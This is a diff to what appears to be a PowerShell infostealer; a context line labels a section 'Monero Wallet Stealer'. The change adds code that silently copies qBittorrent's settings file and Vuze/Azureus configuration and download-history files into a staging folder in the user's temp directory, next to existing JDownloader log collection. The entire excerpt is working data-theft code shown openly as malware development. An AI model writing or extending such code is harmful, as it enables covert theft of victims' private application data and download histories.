@@ -95,11 +95,22 @@ if ($jdl -ne $null) {
 	Copy-Item "$env:appdata\..\Local\JDownloader 2.0\logs" "$env:tmp/$FolderName/JDownloader2.0/logs" -Recurse
 }
 
-# qBittorrent Logs
+# qBittorrent Data
 $qbt = Get-Childitem -Path "$env:appdata\..\Local\qBittorrent\logs" -Include qbittorrent.log -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 if ($qbt -ne $null) {
 	New-Item -Path "$env:tmp/$FolderName/qBittorrent" -ItemType Directory
+	Copy-Item "$env:appdata\qBittorrent\qBittorrent.ini" "$env:tmp/$FolderName/qBittorrent/qBittorrent.ini"
 	Copy-Item "$env:appdata\..\Local\qBittorrent\logs" "$env:tmp/$FolderName/qBittorrent/logs" -Recurse
+}
+
+# Vuze Data
+$qbt = Get-Childitem -Path "$env:appdata\Azureus" -Include downloads.config -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if ($qbt -ne $null) {
+	New-Item -Path "$env:tmp/$FolderName/Vuze" -ItemType Directory
+	Copy-Item "$env:appdata\Azureus\downloads.config" "$env:tmp/$FolderName/Vuze/downloads.config"
+	Copy-Item "$env:appdata\Azureus\dlhistoryd.config" "$env:tmp/$FolderName/Vuze/dlhistoryd.config"
+	Copy-Item "$env:appdata\Azureus\dlhistorya.config" "$env:tmp/$FolderName/Vuze/dlhistorya.config"
+	Copy-Item "$env:appdata\Azureus\azureus.config" "$env:tmp/$FolderName/Vuze/azureus.config"
 }
 
 # Monero Wallet Stealer
